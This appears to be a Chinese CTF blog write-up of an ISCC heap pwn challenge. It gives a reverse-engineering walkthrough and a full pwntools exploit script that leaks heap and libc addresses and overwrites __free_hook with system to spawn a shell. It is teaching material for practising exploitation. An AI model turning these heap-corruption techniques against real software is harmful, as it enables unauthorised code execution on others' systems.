---
title: "ISCC Heap"
description: "一次简单的堆利用"
date: "2026-09-02T09:39:16.988Z"
draft: false
sticky: false
showHeroImage: false
tags: [PWN]
categories: [PWN]
series: [Heap]
comments: true
sidebar:
  enable: true
  toc: true
  relatedPosts: true
---

# ISCC PWN test

> 离最初解出这个附件有 4 个月了，题目虽然出的一坨，但也有其特点与乐趣，今天复现一下，并与 DeepSeek Harness 对比。
> 
> [下载附件](https://sadsnowcat.com/attachment/isccheap.tar.gz)

## 逆向分析

附件是剥离了符号表的，逆向文件时在 IDA 里修复它们。

函数列表如下：

| IDA 视图 | 改为         |
| -------- | ------------ |
| sub_123A | banner       |
| sub_131A |              |
| sub_1392 | menu_teacher |
| sub_13D5 | menu_student |
| sub_1424 | add_student  |
| sub_1538 | give_score   |
| sub_1691 | write_review |
| sub_1875 | call_parent  |
| sub_1A58 | pary_read    |
| sub_1B05 | set_mode     |
| sub_1C5B | check        |
| sub_1E03 | pray         |
| sub_1E62 | change_role  |
| sub_1EBB | change_id    |

全局变量列表：

| IDA 视图   | 修改值                  |
| ---------- | ----------------------- |
| dword_503C | student_number          |
| qword_5080 | student_list            |
| dword_5014 | chances_to_call_parents |
| dword_5010 | role                    |

由于涉及到众多指针和解引用，考虑修结构体，在 Local Types 中添加结构体 

```c
sub_1424(){
  	_QWORD *v2; // [rsp+10h] [rbp-20h]
  	void *v3; // [rsp+18h] [rbp-18h]
    v2 = calloc(1u, 0x20u);				// struct typev2 大小 0x20 
    v3 = calloc(1u, 0x18u);				// struct typev3 大小 0x18 
    *v2 = v3;							// typev2 的前 8 字节为 *typev3 指针
    *(_DWORD *)*v2 = v1[0];				// typev2 的前 4 字节为 int 值 v1[0]
}

sub_1538(){
    if ( *(_DWORD *)(qword_5080[i] + 24LL) == 1 ) 		// typev2 + 24 为 int 值
    {
      puts("the student is lazy! b@d!");
      v2 -= 10;
    }
    *(_DWORD *)(*(_QWORD *)qword_5080[i] + 4LL) = v2;	// typev3 的 4 字节处的 int 值
}

sub_1691(){
    v0 = *(_QWORD *)qword_5080[v3];						
    *(_QWORD *)(v0 + 8) = calloc(1u, v2);				// typev3 +8 为 review 指针
    read(0, *(void **)(*(_QWORD *)qword_5080[v3] + 8LL), v2);
    *(_DWORD *)(*(_QWORD *)qword_5080[v3] + 16LL) = v2; // typev3 +16 为 size
}

sub_1B05(){
    if ( !*(_QWORD *)(qword_5080[a1] + 16LL) ){
      v1 = qword_5080[a1];								
      *(_QWORD *)(v1 + 16) = calloc(1u, 0x20u);			// typev2 +16 为堆上指针
    }
    read(0, *(void **)(qword_5080[a1] + 16LL), 0x20u);
    *(_BYTE *)(qword_5080[a1] + 16LL) = v3;				// 修改 typev2 +16 的低8位
}
sub_1C5B(){
    if ( *(_DWORD *)(qword_5080[a1] + 28LL) == 1 ){} 		// typev2 +28 的 int 值
}
```

根据上面的解引用创建下面两个结构体：

```c
struct StudentData { // sizeof=0x18
  int question_number;
  int score;
  char *review_addr;
  int review_size;
  int pad;
};
struct StudentCtrl { // sizeof=0x20
  StudentData *dataptr;
  char name[8];
  void *modeptr;
  int is_lazy;
  int is_reward;
};
```

按 `Y` 将 `student_list` 的类型改为 `StudentCtrl *student_list[10];` 得到修好的代码

```c
unsigned __int64 add_student()
{
  _DWORD v1[2]; // [rsp+8h] [rbp-28h] BYREF
  StudentCtrl *v2; // [rsp+10h] [rbp-20h]
  StudentData *v3; // [rsp+18h] [rbp-18h]
  unsigned __int64 v4; // [rsp+28h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  v1[1] = 0;
  v1[0] = 0;                                    // the number of question
  if ( student_number <= 6 )
  {
    v2 = calloc(1u, 0x20u);
    v3 = calloc(1u, 0x18u);
    v2->dataptr = v3;                           // v2 的前 8 字节为指针，指向 v3
    student_list[student_number++] = v2;
    printf("enter the number of questions: ");
    __isoc99_scanf("%d", v1);
    if ( v1[0] <= 9 && v1[0] > 0 )
    {
      v2->dataptr->question_number = v1[0];     // v3 类型的前 4 字节为 v1[0]
      puts("finish");
    }
    else
    {
      puts("wrong input!");
    }
  }
  else
  {
    puts("No more students!");
  }
  return __readfsqword(0x28u) ^ v4;
}

unsigned __int64 give_score()
{
  unsigned int i; // [rsp+8h] [rbp-18h]
  int v2; // [rsp+Ch] [rbp-14h]
  _BYTE buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  puts("marking testing papers.....");
  for ( i = 0; i < student_number; ++i )
  {
    if ( read(fd, buf, 8u) != 8 )
    {
      puts("read_error");
      exit(-1);
    }
    buf[0] &= ~0x80u;                           // buf[0] 的最高位清零
    v2 = buf[0] % (10 * student_list[i]->dataptr->question_number);
    printf("score for the %dth student is %d\n", i, v2);
    if ( student_list[i]->is_lazy == 1 )        // 校验 typev2 的 24 字节处的 int 值
    {
      puts("the student is lazy! b@d!");
      v2 -= 10;
    }
    student_list[i]->dataptr->score = v2;       // typev3 的 4 字节处的 int 值
  }
  puts("finish");
  return __readfsqword(0x28u) ^ v4;
}

unsigned __int64 write_review()
{
  StudentData *dataptr; // rbx
  int size; // [rsp+10h] [rbp-20h] BYREF
  int idx; // [rsp+14h] [rbp-1Ch] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-18h]

  v4 = __readfsqword(0x28u);
  size = 0;
  idx = 0;
  printf("which one? > ");
  __isoc99_scanf("%d", &idx);
  if ( student_list[idx]->dataptr->review_addr )
  {
    puts("enter your comment:");
    read(0, student_list[idx]->dataptr->review_addr, student_list[idx]->dataptr->preview_size);
    puts("finish");
  }
  else
  {
    printf("please input the size of comment: ");
    __isoc99_scanf("%d", &size);
    if ( size <= 1023 && size > 0 )
    {
      dataptr = student_list[idx]->dataptr;
      dataptr->review_addr = calloc(1u, size);  // 申请评论
      puts("enter your comment:");
      read(0, student_list[idx]->dataptr->review_addr, size);
      student_list[idx]->dataptr->preview_size = size;
      puts("finish");
    }
    else
    {
      puts("wrong length :'(");
    }
  }
  return __readfsqword(0x28u) ^ v4;
}

void call_parent()
{
  unsigned int index; // [rsp+8h] [rbp-18h]
  char buf[10]; // [rsp+Eh] [rbp-12h] BYREF
  unsigned __int64 v2; // [rsp+18h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("only 3 chances to call parents!");
  if ( chances_to_call_parents )
  {
    --chances_to_call_parents;
    if ( student_number )
    {
      puts("which student id to choose?");
      read(0, buf, 5u);
      index = atoi(buf);
      if ( index <= 9 && student_list[index] )
      {
        printf("bad luck for student %d! Say goodbye to him/her!", index);
        if ( student_list[index]->dataptr->review_addr )
          free(student_list[index]->dataptr->review_addr);
        free(student_list[index]->dataptr);
        free(student_list[index]);
        student_list[index] = 0;
        --student_number;
      }
      else
      {
        puts("please watch carefully :)");
      }
    }
    else
    {
      puts("add some students first!");
    }
  }
  else
  {
    puts("no you can't");
  }
}

unsigned __int64 __fastcall set_mode(int a1)
{
  StudentCtrl *v1; // rbx
  unsigned int v3; // [rsp+14h] [rbp-1Ch] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-18h]

  v4 = __readfsqword(0x28u);
  if ( student_list[a1]->is_lazy != 1 )
  {
    if ( !student_list[a1]->modeptr )
    {
      v1 = student_list[a1];
      v1->modeptr = calloc(1u, 0x20u);
    }
    puts("enter your mode!");
    read(0, student_list[a1]->modeptr, 0x20u);
    goto LABEL_8;
  }
  puts("enter your pray score: 0 to 100");
  __isoc99_scanf("%d", &v3);
  if ( v3 <= 0x64 )
  {
    LOBYTE(student_list[a1]->modeptr) = v3;     // 改单字节
LABEL_8:
    puts("finish");
    return __readfsqword(0x28u) ^ v4;
  }
  puts("bad!");
  return __readfsqword(0x28u) ^ v4;
}

unsigned __int64 __fastcall check(int a1)
{
  _BYTE *v1; // rax
  char nptr[24]; // [rsp+20h] [rbp-20h] BYREF
  unsigned __int64 v4; // [rsp+38h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  if ( student_list[a1]->is_reward == 1 )
  {
    puts("already gained the reward!");
  }
  else
  {
    if ( student_list[a1]->dataptr->score > 0x59u )
    {
      printf("Good Job! Here is your reward! %p\n", student_list[a1]);// 分数大于等于 90 打印堆地址
      printf("add 1 to wherever you want! addr: ");
      sub_131A(0, nptr, 16);
      v1 = atol(nptr);
      ++*v1;                                    // 指定地址 +1
      student_list[a1]->is_reward = 1;
    }
    if ( student_list[a1]->dataptr->review_addr )// 打印 review
    {
      puts("here is the review:");
      write(1, student_list[a1]->dataptr->review_addr, student_list[a1]->dataptr->preview_size);
    }
    else
    {
      puts("no reviewing yet!");
    }
  }
  return __readfsqword(0x28u) ^ v4;
}

int __fastcall pray(int a1)
{
  puts("prayer...Good luck to you");
  student_list[a1]->is_lazy ^= 1u;
  return puts("finish");
}
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  int v4; // [rsp+0h] [rbp-20h]
  char buf[10]; // [rsp+Eh] [rbp-12h] BYREF
  unsigned __int64 v6; // [rsp+18h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  banner(a1, a2, a3);
  printf("role: <0.teacher/1.student>: ");
  __isoc99_scanf("%d", &role);
  while ( 1 )
  {
    while ( !role )
    {
      menu_teacher();                           // teacher mode
                                                // 1. add a student
                                                // 2. give a score
                                                // 3. write a review
                                                // 4. call his/her parent
                                                // 5. change role
      printf("choice>> ");
      read(0, buf, 2u);
      switch ( atoi(buf) )
      {
        case 1:
          add_student();
          break;
        case 2:
          give_score();
          break;
        case 3:
          write_review();
          break;
        case 4:
          call_parent();
          break;
        case 5:
          role = change_role();
          break;
        case 6:
          never_pray();
        default:
          continue;
      }
    }
    v4 = 0;
    if ( !student_number )
      break;
    while ( role == 1 )
    {
      menu_student();                           // 1. do the test
                                                // 2. check for review
                                                // 3. pray
                                                // 4. set mode
                                                // 5. change role
                                                // 6. change id
      printf("choice>> ");
      read(0, buf, 2u);
      switch ( atoi(buf) )
      {
        case 1:
          test();
          break;
        case 2:
          check(v4);
          break;
        case 3:
          pray(v4);
          break;
        case 4:
          set_mode(v4);
          break;
        case 5:
          role = change_role();
          break;
        case 6:
          v4 = change_id();
          break;
        default:
          continue;
      }
    }
  }
  puts("no student yet");
  return 0;
}
```

## 漏洞挖掘和利用链

- `write_review()` 输入长度小于 0x400

- `call_parent()`  free 堆块
- `check_review(id)` 如果 `chunk_list[id]->dataptr->score > 0x59` 将获得 `chunk_list[id]` 的偏移并 **任意地址 +1** ，将 `chunk_list[id]->is_reward` 赋值为 1 。如果有 `review` 则 `write` 出 `chunk_list[a1]->dataptr->review` 的内容
- `pray()` 修改 `chunk_list[id]->is_lazy` 
- `set_mode()` 可以将 `chunk_list[]->mode_ptr` 的低16位设置成输入的数字，并改写，范围是 `0 ~ 0x64` 。

在分析完 `set_mode()` 后，发现可以通过修改 `chunk_list[id]->mode_ptr` 的低16位来想办法修改 `score` 比如修改成 `0x64` 

如果发现没有修改到我们想要的地方，那就再多添加几个 Student 作为 **“垫子”** 就可以修改成功了

那么利用链为：

- `set_mode()` 和 `pary()` 搭配，修改  `chunk_list[id]->dataptr->score > 0x59` 
- `check_review()` 获取堆地址
- `check_review()` 的 **对内存中任意地址处的字节进行加一操作** 伪造一个大于 0x410 的chunk
- free 这个 chunk 进入 `unsorted bin` , 准备泄露 libc
- `set_mode()` 和 `pary()` 搭配，用任意写修改其他的 `chunk_list[id]->dataptr->review` 和 `chunk_list[id]->dataptr->review_len` 和 `chunk_list[id]->reward_flag` 
- 再次 `check_review()` 获取 Libc 地址
- **考虑` tcache poison` 等利用手法将 `__free_hook()` 改成 `system()` ，但是存在任意写，最便捷的方法是用 `set_mode()` 和 `pary()` 搭配 的任意写来完成。**

## Exploit

```python
from pwn import *
context(arch='amd64', log_level='debug', os='linux')
context.terminal = ['tmux','new-window']

# io = remote()
libc = ELF('./libc.so.6')
io = process('./pwn')

def role(num):
    io.sendlineafter(b'>:',str(num).encode())

def menu(choice):
    io.sendlineafter(b'>>',str(choice).encode())

def change_role(num):
    menu(5)
    role(num)

def add_student(num):
    menu(1)
    io.sendlineafter(b': ',str(num).encode())

def give_score():
    menu(2)

def write_review(idx, comment=b''):
    menu(3)
    io.sendlineafter(b'which one? > ', str(idx).encode())
    
    response = io.recvuntil(b': ')
    
    if b'size' in response:
        io.sendline(str(len(comment)).encode())
        io.sendlineafter(b'comment:\n', comment)
    else:
        io.sendline(comment)
    
    io.recvuntil(b'finish')

def call_parent(idx):
    menu(4)
    io.sendlineafter(b'?\n',str(idx).encode())

def change_id(idx):
    menu(6)
    io.sendlineafter("input your id: ",str(idx).encode())

def check():
    menu(2)

# pary() 将修改 is_flag
def pray():
    menu(3)

def set_mode_lazy(score):
    menu(4);
    io.sendlineafter(b'100',str(score).encode())

def set_mode_nolazy(content):
    menu(4);
    io.sendafter(b'enter your mode!',content)


debugger = '''
break *$rebase(0x1FD8)
break *$rebase(0x20E2)
c
'''

# gdb.attach(io,debugger)
role(0)
add_student(9)                  # 0
add_student(9)                  # 1
give_score()

change_role(1)                  # student 0
change_id(1)                    # student 1
payload=b'A'*8*3
set_mode_nolazy(payload)        # 随便填一次 set mode
pray()                          # edit is_lazy = 1
set_mode_lazy(0x20)             # student_list[1]->mode_ptr
pray()                          # edit is_lazy = 0
payload2 = p32(9)+p32(0x60)+p64(0)*2+p64(0x31)
set_mode_nolazy(payload2)       # student_list[1]->dataptr->score = 0x60

change_role(0)
write_review(0,b'A'*0x3f8)
add_student(9)                  # 2
write_review(1,b'B'*0xa8)
add_student(9)                  # 3 

change_role(1)
change_id(1)
check()
io.recvuntil(b"your reward! ")
line = io.recvline()
addr_hex = line.split()[-1]
heap_addr = int(addr_hex, 16)
log.success(f"heap: {hex(heap_addr)}")
heap_base = heap_addr-0x2f0
un_addr = heap_addr+0x79
print(hex(un_addr))

io.recvuntil("addr: ")
io.send(f"{un_addr}")

change_role(0)
call_parent(0)

change_role(1)
change_id(1)
payload3 = flat(
    p32(9),
    p32(0x60),
    p64(heap_base + 0x370),
    p64(8)
)
set_mode_nolazy(payload3)
pray()
set_mode_lazy(0x8)
pray()
set_mode_nolazy(p64(0))

check()
io.sendafter("addr: ",str(heap_base+0x400))
io.recvuntil(b"here is the review:\n")

libc_base = u64(io.recv(6).ljust(8, b'\x00')) -0x1ecbe0
log.success(f"libc: {hex(libc_base)}")

free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']

pray()
set_mode_lazy(0x00)              
pray()
set_mode_nolazy(p64(free_hook))    # 将 __free_hook 的地址写到堆里，让堆里的指针指向 libc
set_mode_nolazy(p64(system))       # 将 system 的地址写到 __free_hook 里

change_role(0)
write_review(3,b"/bin/sh\x00")
call_parent(3)

io.interactive()
```

> DeepSeek Harness 的 libc 偏移泄漏常量错了一页，导致一直没有解出 😄😄
